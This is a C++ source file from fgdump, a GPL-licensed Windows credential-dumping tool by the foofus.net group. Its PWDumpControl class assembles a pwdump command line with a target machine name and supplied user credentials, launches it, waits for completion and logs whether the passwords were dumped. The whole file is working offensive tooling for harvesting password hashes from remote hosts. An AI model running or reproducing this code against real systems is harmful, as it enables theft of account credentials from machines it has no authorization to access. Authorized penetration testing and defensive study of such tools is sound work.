/******************************************************************************
fgdump - by fizzgig and the foofus.net group
Copyright (C) 2008 by fizzgig
http://www.foofus.net

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
******************************************************************************/
#include "StdAfx.h"
#include "pwdumpcontrol.h"
#include "Process.h"

PWDumpControl::PWDumpControl(LONG nCacheID)
{
	m_nCacheID = nCacheID;
}

PWDumpControl::~PWDumpControl(void)
{

}

bool PWDumpControl::Execute(const char* lpszPWDumpPath, char* lpszMachine, char* lpszUser, char* lpszPwd, bool bIs64Bit, bool bSkipHistory)
{
	char* lpszCmdLineFormat;
	int nArgSize;
	const char* lpszStopCmdLine = lpszPWDumpPath;
	char* lpszParams;
	bool result = false;
	char szCurrentDir[MAX_PATH + 1];

	memset(szCurrentDir, 0, MAX_PATH + 1);
	GetCurrentDirectory(MAX_PATH, szCurrentDir);

	if (bSkipHistory)
	{
		Log.CachedReportError(m_nCacheID, INFO, "Skipping password histories for this server\n");
		if (bIs64Bit)
			lpszCmdLineFormat = " -n -x -o \"%s\\%s.pwdump\" -u \"%s\" -p \"%s\" %s";
		else
			lpszCmdLineFormat = " -n -o \"%s\\%s.pwdump\" -u \"%s\" -p \"%s\" %s";

	}
	else
	{
		if (bIs64Bit)
			lpszCmdLineFormat = " -x -o \"%s\\%s.pwdump\" -u \"%s\" -p \"%s\" %s";
		else
			lpszCmdLineFormat = " -o \"%s\\%s.pwdump\" -u \"%s\" -p \"%s\" %s";
	}

	nArgSize = _scprintf(lpszCmdLineFormat, szCurrentDir, lpszMachine, lpszUser, lpszPwd, lpszMachine);

	lpszParams = new char[nArgSize + 1];
	memset(lpszParams, 0, nArgSize + 1);

	try
	{
		Process p;
		_snprintf(lpszParams, nArgSize, lpszCmdLineFormat, szCurrentDir, lpszMachine, lpszUser, lpszPwd, lpszMachine);
		//Log.CachedReportError(m_nCacheID, DEBUG, "Parameters to pwdump are: %s\n", lpszParams);

		HANDLE hProcess = p.CreateProcess(lpszStopCmdLine, lpszParams);
		if (hProcess != 0)
		{
			DWORD dwResult = WaitForSingleObject(hProcess, 1200000);	// Wait 20 minutes for process to complete
			if (dwResult != WAIT_OBJECT_0)
			{
				Log.CachedReportError(m_nCacheID, CRITICAL, "Warning: pwdump did not complete in a timely manner - exiting");
				result = false;
			}
			else
			{
				// Read from process's output
				char* szResult;
				int nSize = 4096;

				szResult = new char[nSize];
				memset(szResult, 0, nSize);
				p.ReadFromPipe(&szResult, nSize);

				// Was it successful?
				if (strstr(szResult, "Completed") != NULL)
				{
					// Success
					Log.CachedReportError(m_nCacheID, CRITICAL, "Passwords dumped successfully\n", lpszMachine);
					result = true;
				}
				else
				{
					// Failed
					Log.CachedReportError(m_nCacheID, CRITICAL, "Failed to dump passwords: %s\n", szResult);
					result = false;
				}

				delete [] szResult;
			}
		}
		else
			result = false;
	}
	catch(...)
	{
		result = false;
	}

	delete [] lpszParams;

	return result;
}

